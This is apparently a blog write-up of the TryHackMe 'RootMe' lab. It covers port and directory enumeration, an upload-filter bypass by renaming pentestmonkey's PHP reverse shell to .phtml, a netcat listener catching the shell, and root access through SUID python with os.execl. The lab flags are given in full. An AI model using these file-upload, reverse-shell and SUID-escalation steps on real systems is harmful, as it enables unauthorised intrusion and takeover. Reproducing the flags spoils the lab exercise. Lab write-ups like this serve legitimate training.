---
layout: single
title: RootMe - TryHackMe
excerpt: "RootMe is a quick and fun easy CTF for beginners where we have to upload a php file to receive a reverse shell and use python to be root"
date: 2023-01-31
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-rootme/iconxd.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackme
tags:  
  - SUID
  - PHP
---
![](/assets/images/try-writeup-rootme/icon.png)

RootMe is a quick and fun easy CTF for beginners where we have to upload a php file to receive a reverse shell and use python to be root

## PortScan

```
Nmap scan report for 10.10.55.4
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Task 2 Reconnaissance

*Scan the machine, how many ports are open?* `2`

*What version of Apache is running?* `2.4.29`

*What service is running on port 22?* `ssh`

*Find directories on the web server using the GoBuster tool.* `No answer needed`

To answer the last question we need to do fuzzing first

```
❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -u http://10.10.55.4
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.4
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/31 23:38:50 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 305] [--> http://10.10.55.4/js/]
/uploads              (Status: 301) [Size: 310] [--> http://10.10.55.4/uploads/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.55.4/css/]    
/panel                (Status: 301) [Size: 308] [--> http://10.10.55.4/panel/]  
/server-status        (Status: 403) [Size: 275]
```

*What is the hidden directory?* `/panel/`

The same directories
```
❯ nmap --script http-enum -p80 10.10.55.4 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-31 23:41 CST
Nmap scan report for 10.10.55.4
Host is up (0.16s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

```

## Getting a shell

WebPage

```js
❯ whatweb http://10.10.55.4
http://10.10.55.4 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.55.4], Script, Title[HackIT - Home]
```

This is the WebPage

![](/assets/images/try-writeup-rootme/webpage.png)

We can upload files in `/panel/`

![](/assets/images/try-writeup-rootme/panel.png)

The web have PHP so can try to upload a file to receive a reverse shell

- [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```
❯ git clone https://github.com/pentestmonkey/php-reverse-shell
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 4.90 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
❯ ls
 php-reverse-shell
❯ cd php-reverse-shell
❯ ls
 CHANGELOG   COPYING.GPL   COPYING.PHP-REVERSE-SHELL   LICENSE   php-reverse-shell.php   README.md
```

Now we have to modify the script with our IP and port 

![/assets/images/try-writeup-rootme/xd.png](/assets/images/try-writeup-rootme/xd.png)


If you try to upload the file doesn't work 

![/assets/images/try-writeup-rootme/F.png](/assets/images/try-writeup-rootme/F.png)


We need to bypass that so change the name of the script

```
❯ mv php-reverse-shell.php php-r.phptml
❯ ls
 CHANGELOG   COPYING.GPL   COPYING.PHP-REVERSE-SHELL   LICENSE   php-r.phptml   README.md
```

It works 

![/assets/images/try-writeup-rootme/work.png](/assets/images/try-writeup-rootme/work.png)

Now go to `/uploads`

![/assets/images/try-writeup-rootme/shell.png](/assets/images/try-writeup-rootme/shell.png)


Now listen on the port you put in the script

```
❯ nc -lvnp 443
listening on [any] 443 ...
```

Click on the file if you have problems or you don't receive the shell change the name of the script `.php5`

![/assets/images/try-writeup-rootme/click.png](/assets/images/try-writeup-rootme/click.png)


```
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.12.205] from (UNKNOWN) [10.10.55.4] 41936
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:11:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@rootme:/$
Ctrl+z
stty raw -echo; fg
reset xterm
```

## User.txt

```
www-data@rootme:/$ find / -name user.txt 2>/dev/null
/var/www/user.txt
www-data@rootme:/$
```

```
www-data@rootme:/$ cat /var/www/user.txt 
THM{y0u_g0t_a_sh3ll}
www-data@rootme:/$
```

## Privilege escalation

Python is SUID

```
www-data@rootme:/$ find / -perm -4000 2>/dev/null | grep -v snap   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
www-data@rootme:/$
```

*Search for files with SUID permission, which file is weird?* `/usr/bin/python`

*Find a form to escalate your privileges.* `no answer needed`

Before root.txt

-[Be root with python](https://gtfobins.github.io/gtfobins/python/#suid)

```
www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt  
THM{pr1v1l3g3_3sc4l4t10n}
# 
```

*root.txt* `THM{pr1v1l3g3_3sc4l4t10n}`















































